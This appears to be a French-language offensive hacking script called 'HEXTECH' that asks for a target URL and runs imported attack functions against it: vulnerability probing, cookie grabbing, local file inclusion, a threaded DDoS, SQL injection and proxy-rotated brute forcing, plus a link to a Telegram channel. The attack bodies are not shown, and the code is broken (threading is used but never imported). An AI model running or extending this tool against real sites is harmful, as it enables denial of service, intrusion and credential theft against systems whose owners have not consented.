import requests
from termcolor import colored
import random
import time
import socket
from tests import detect_vulnerability, get_cookies, lfi_test, ddos_attack, bruteforce_attack_with_proxies, advanced_sql_injection_test

# Liste de proxies à utiliser
PROXY_LIST = ['http://proxy1', 'http://proxy2', 'http://proxy3']

def afficher_menu():
    print("""
    ****************************************
    *        Bienvenue sur HEXTECH         *
    ****************************************
    * 1. Entrer l'URL du site cible        *
    * 2. Rejoindre notre canal Telegram    *
    ****************************************
    """)

def main():
    afficher_menu()
    choix = input("Choisissez une option (1 ou 2) : ")
    
    if choix == "1":
        url = input("Entrez l'URL du site cible : ")
        print(f"Analyse en cours sur {url}...\n")
        run_tests(url)
    elif choix == "2":
        print("Redirection vers le canal Telegram...")
        import os
        os.system("xdg-open https://t.me/+IcftRA7eTCNiOGFk?start=7699384839")
    else:
        print("Option invalide. Veuillez réessayer.")
        main()

def run_tests(url):
    print(colored("[WARNING ⚠️] Début de l'injection ...", "cyan"))

    # Détection de vulnérabilités
    if detect_vulnerability(url):
        print(colored("[+] Vulnérabilité confirmée.", "green"))
    else:
        print(colored("[RAPPORT ☣️] Pas de vulnérabilités détectées.", "red"))

    # Récupération de cookies
    cookies = get_cookies(url)
    if cookies:
        print(colored(f"[+] Cookies trouvés : {cookies}", "green"))

    # Test d'inclusion de fichier local (LFI)
    lfi_result = lfi_test(url)
    if lfi_result:
        print(colored(f"[+] Contenu du fichier : {lfi_result}", "green"))
    else:
        print(colored("[HEXTECH] Test LFI échoué.", "red"))

    # Lancement de l'attaque DDoS
    ddos_thread = threading.Thread(target=ddos_attack, args=(url,))
    ddos_thread.start()

    # Attendre la fin de l'attaque DDoS avant de lancer le bruteforce
    ddos_thread.join()

    # Test d'injection SQL avancée
    advanced_sql_injection_test(url)

    # Test de bruteforce avec proxy (Exécuté en dernier)
    bruteforce_result = bruteforce_attack_with_proxies(url, chars="abc123", max_length=3)
    if bruteforce_result:
        print(colored(f"[+] Bruteforce réussi avec : {bruteforce_result}", "green"))
    else:
        print(colored("[-] Bruteforce échoué.", "red"))

    print(colored("[*] Tests terminés.", "cyan"))

if __name__ == "__main__":
    main()